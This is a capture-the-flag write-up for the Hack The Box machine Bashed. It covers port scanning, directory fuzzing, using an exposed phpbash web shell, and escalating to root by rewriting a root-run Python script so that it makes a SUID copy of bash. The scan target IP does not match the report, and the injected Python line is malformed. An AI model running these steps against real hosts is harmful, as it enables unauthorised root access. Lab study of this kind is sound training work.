# HTB Bashed Writeup

## Reconnaissance

`nmap -sC -sV -p- -Pn 10.10.10.3`

```
Nmap scan report for 10.10.10.68
Host is up (0.079s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 688.29 seconds
```

## Enumeration

### Port 80 

- Port 80 is hosting a static webpage with a single entry of an article about phpbash

<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-01-22 at 10.31.41 PM.png" width=50% height=50%>

- Navigating to page of the article shows a Github link to a repository for phpbash
	- phpbash is a tool written in PHP that provides a web shell that interacts with the web server.
		 - https://github.com/Arrexel/phpbash

<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-01-24 at 10.18.37 PM.png" width=50% height=50%>

- Directory/file enumeration of the parent directory of the web server provides the following:

`ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -mc 200,301,403 -u http://10.10.10.68/FUZZ `

<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-01-24 at 10.25.14 PM.png" width=50% height=50%>

- Going through the dev subdirectory shows the phpbash scripts mentioned in the article
	- This provides access to the web server via the phpbash web shell

<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-01-24 at 10.36.10 PM.png" width=50% height=50%>

## Exploitation

- Navigating to the `phpbash.php` file provides us with a web shell as the user `www-data`

<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-01-24 at 10.40.21 PM.png" width=50% height=50%>

## Privilege Escalation

- `www-data` can run privileged commands through the user `scriptmanager` 

<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-01-24 at 10.44.30 PM.png" width=50% height=50%>

- Searching the server for specific files owned by `scriptmanager` yields the following:

`find . -maxdepth 1 -user scriptmanager | ls -l`

<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-01-24 at 11.02.42 PM.png" width=50% height=50%>
<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-01-24 at 11.06.36 PM.png" width=50% height=50%>

- The `scripts` directory is only accessible to the `scriptmanager` user. The current user can run elevated commands through `scriptmanager`:

<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-01-24 at 11.15.44 PM.png" width=50% height=50%>

<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-01-24 at 11.27.37 PM.png" width=50% height=50%>

- `test.py` is a script that creates and writes to a file with `root` privileges. This script is most likely being ran periodicly. Elevating privileges using GTFOBin's [bash](https://gtfobins.github.io/gtfobins/bash/) can be possible by rewriting the script to create a copy of bash shell in the `tmp` directory.

`sudo -u scriptmanager echo 'os.system(cp /bin/bash /tmp/bash; chmod +s /tmp/bash)' > test.py`

- After waiting, we can elevate to root by utilizing the `-p` flag of bash






